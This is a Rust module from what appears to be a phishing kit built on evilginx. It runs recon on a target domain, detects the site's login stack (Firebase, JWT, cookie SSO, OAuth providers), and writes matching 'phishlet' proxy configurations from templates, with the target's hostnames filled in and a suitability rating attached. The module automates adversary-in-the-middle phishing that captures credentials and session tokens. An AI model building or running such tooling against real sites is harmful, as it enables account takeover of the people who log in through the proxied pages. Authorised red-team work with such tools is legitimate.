use std::fs;
use std::path::PathBuf;

use serde::{Deserialize, Serialize};

use crate::engagement::{
    default_dryrun_domain, landing_sub, normalize_target_host, phishlet_name_for_target, site_host,
    upstream_domain,
};
use crate::error::{AppError, AppResult};
use crate::kit::kit_root;
use crate::recon::{detect_target, StackInfo};

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct PatternTemplate {
    pub id: String,
    pub name: String,
    pub stack: String,
    pub description: String,
    pub yaml: String,
}

#[derive(Debug, Serialize)]
pub struct GenerateResult {
    pub ok: bool,
    pub phishlet: String,
    pub dryrun_domain: String,
    pub target_domain: String,
    pub upstream_domain: String,
    pub stack_info: StackInfo,
    pub path: String,
    pub created: bool,
    pub message: String,
}

fn templates_dir(root: &std::path::Path) -> PathBuf {
    root.join("kit/evilginx/phishlet-templates")
}

fn phishlets_dir(root: &std::path::Path) -> PathBuf {
    root.join("kit/evilginx/phishlets")
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct PhishletYaml {
    pub name: String,
    pub path: String,
    pub yaml: String,
}

pub fn get_phishlet_yaml(name: String) -> AppResult<PhishletYaml> {
    let root = kit_root()?;
    let stem = name
        .trim()
        .trim_end_matches(".yaml")
        .trim_end_matches(".yml");
    if stem.is_empty() || stem.contains('/') || stem.contains("..") {
        return Err(AppError::msg("invalid phishlet name"));
    }
    let path = phishlets_dir(&root).join(format!("{stem}.yaml"));
    if !path.is_file() {
        return Err(AppError::msg(format!("phishlet not found: {stem}")));
    }
    Ok(PhishletYaml {
        name: stem.to_string(),
        path: path.display().to_string(),
        yaml: fs::read_to_string(&path)?,
    })
}

pub fn save_phishlet_yaml(name: String, yaml: String) -> AppResult<PhishletYaml> {
    let root = kit_root()?;
    let stem = name
        .trim()
        .trim_end_matches(".yaml")
        .trim_end_matches(".yml");
    if stem.is_empty() || stem.contains('/') || stem.contains("..") {
        return Err(AppError::msg("invalid phishlet name"));
    }
    let text = yaml.trim_end().to_string() + "\n";
    if text.trim().is_empty() {
        return Err(AppError::msg("phishlet YAML is empty"));
    }
    // Light sanity checks — evilginx will validate fully on load
    if !text.contains("proxy_hosts:") && !text.contains("proxy_hosts :") {
        return Err(AppError::msg("YAML must include proxy_hosts"));
    }
    let dir = phishlets_dir(&root);
    fs::create_dir_all(&dir)?;
    let path = dir.join(format!("{stem}.yaml"));
    fs::write(&path, &text)?;
    Ok(PhishletYaml {
        name: stem.to_string(),
        path: path.display().to_string(),
        yaml: text,
    })
}

pub fn list_pattern_templates() -> AppResult<Vec<PatternTemplate>> {
    let root = kit_root()?;
    let catalog = templates_dir(&root).join("catalog.json");
    if !catalog.is_file() {
        return Ok(vec![]);
    }
    let v: serde_json::Value = serde_json::from_str(&fs::read_to_string(catalog)?)?;
    let list: Vec<PatternTemplate> = serde_json::from_value(v["templates"].clone())?;
    Ok(list)
}

/// Fill template placeholders from the exact website hostname the operator entered.
/// Never invents a www./login. prefix — apex sites get empty phish_sub.
fn apply_placeholders(content: &str, target_host: &str) -> String {
    let upstream = upstream_domain(target_host);
    let site = site_host(target_host);
    let land = landing_sub(target_host);
    let land_q = land.replace('\'', "");

    content
        .replace("SITE_HOST", &site)
        .replace("PORTAL_HOST", &site) // legacy template token
        .replace("LANDING_HOST", &site)
        .replace("LANDING_SUB", &land_q)
        .replace("TARGET_DOMAIN", &upstream)
        .replace("LOOKALIKE_DOMAIN", &upstream)
}

fn template_yaml_for_stack(
    root: &std::path::Path,
    stack: &str,
    template_id: Option<&str>,
) -> PathBuf {
    let tdir = templates_dir(root);
    if let Some(id) = template_id {
        if let Ok(list) = list_pattern_templates() {
            if let Some(t) = list.into_iter().find(|t| t.id == id) {
                let p = tdir.join(&t.yaml);
                if p.is_file() {
                    return p;
                }
            }
        }
    }
    let name = match stack {
        "firebase" => "firebase.yaml",
        "jwt_body" => "jwt-api.yaml",
        "cookie_session" => "cookie-sso.yaml",
        "oauth" | "auth0" | "okta" | "cognito" => "oauth-oidc.yaml",
        _ => "generic-spa.yaml",
    };
    let p = tdir.join(name);
    if p.is_file() {
        return p;
    }
    let g = phishlets_dir(root).join("generic.yaml");
    if g.is_file() {
        return g;
    }
    tdir.join("generic-spa.yaml")
}

pub fn scaffold_from_pattern(target: &str, template_id: &str) -> AppResult<GenerateResult> {
    let root = kit_root()?;
    let host = normalize_target_host(target);
    if host.is_empty() {
        return Err(AppError::msg("Enter a target domain"));
    }
    let list = list_pattern_templates()?;
    let tmpl = list
        .into_iter()
        .find(|t| t.id == template_id)
        .ok_or_else(|| AppError::msg(format!("Unknown template: {template_id}")))?;
    let src = templates_dir(&root).join(&tmpl.yaml);
    if !src.is_file() {
        return Err(AppError::msg(format!(
            "Template file missing: {}",
            tmpl.yaml
        )));
    }
    let name = phishlet_name_for_target(&host);
    let dest = phishlets_dir(&root).join(format!("{name}.yaml"));
    let content = apply_placeholders(&fs::read_to_string(&src)?, &host);
    fs::create_dir_all(phishlets_dir(&root))?;
    fs::write(&dest, content)?;
    Ok(GenerateResult {
        ok: true,
        phishlet: name,
        dryrun_domain: default_dryrun_domain(&host),
        target_domain: host,
        upstream_domain: upstream_domain(target),
        stack_info: StackInfo {
            stack: tmpl.stack.clone(),
            label: tmpl.name,
            signals: vec![format!("pattern:{}", tmpl.id)],
            firebase_keys: vec![],
            login_path: Some("/login".into()),
            cloudflare: false,
            turnstile: false,
            suitability: if tmpl.stack == "oauth" {
                "caution".into()
            } else {
                "good".into()
            },
            suitability_notes: vec![format!("Scaffolded from pattern {}", tmpl.id)],
        },
        path: dest.display().to_string(),
        created: true,
        message: format!("Scaffolded from pattern {}", tmpl.id),
    })
}

pub fn generate_phishlet(target: &str, overwrite: bool) -> AppResult<GenerateResult> {
    let root = kit_root()?;
    let host = normalize_target_host(target);
    if host.is_empty() {
        return Err(AppError::msg("Enter a target domain"));
    }
    let recon = detect_target(target)?;
    let name = phishlet_name_for_target(&host);
    let dest = phishlets_dir(&root).join(format!("{name}.yaml"));
    if dest.is_file() && !overwrite {
        let text = fs::read_to_string(&dest)?;
        if !text.contains("TARGET_DOMAIN")
            && !text.contains("PORTAL_HOST")
            && !text.contains("LANDING_SUB")
        {
            return Ok(GenerateResult {
                ok: true,
                phishlet: name,
                dryrun_domain: default_dryrun_domain(&host),
                target_domain: host,
                upstream_domain: recon.upstream_domain,
                stack_info: recon.stack_info,
                path: dest.display().to_string(),
                created: false,
                message: "Reusing existing phishlet".into(),
            });
        }
    }

    let src = template_yaml_for_stack(&root, &recon.stack_info.stack, None);
    if !src.is_file() {
        return Err(AppError::msg(format!(
            "No template found at {}",
            src.display()
        )));
    }
    let mut content = apply_placeholders(&fs::read_to_string(&src)?, &host);
    if let Some(ref lp) = recon.stack_info.login_path {
        content = content.replacen("path: '/login'", &format!("path: '{lp}'"), 1);
    }
    fs::create_dir_all(phishlets_dir(&root))?;
    fs::write(&dest, content)?;
    let msg = format!("Generated phishlet for {host}");
    Ok(GenerateResult {
        ok: true,
        phishlet: name,
        dryrun_domain: default_dryrun_domain(&host),
        target_domain: host,
        upstream_domain: recon.upstream_domain,
        stack_info: recon.stack_info,
        path: dest.display().to_string(),
        created: true,
        message: msg,
    })
}
